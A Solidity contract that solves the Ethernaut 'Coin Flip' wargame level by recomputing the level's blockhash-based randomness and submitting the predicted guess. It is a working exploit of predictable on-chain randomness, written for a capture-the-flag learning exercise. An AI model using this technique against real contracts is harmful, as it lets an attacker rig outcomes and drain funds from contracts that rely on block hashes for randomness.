// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/// @notice Minimal interface used by the solver to call the CoinFlip level.
interface ICoinFlip {
    function flip(bool guess) external returns (bool);
}

/// @title Ethernaut 03 - Coin Flip Solver
/// @notice Reproduces the level's deterministic calculation and submits the predicted result.
contract CoinFlipSolver {
    uint256 constant FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    /// @notice CoinFlip level instance solved by this contract.
    ICoinFlip public immutable target;

    /// @param targetAddress Address of the CoinFlip level instance.
    constructor(address targetAddress) {
        target = ICoinFlip(targetAddress);
    }

    /// @notice Predicts the current round from the previous block hash and submits the result.
    function solve() external {
        uint256 previousBlockHashValue = uint256(blockhash(block.number - 1));
        uint256 predictedOutcome = previousBlockHashValue / FACTOR;
        bool predictedSide = predictedOutcome == 1;

        target.flip(predictedSide);
    }
}
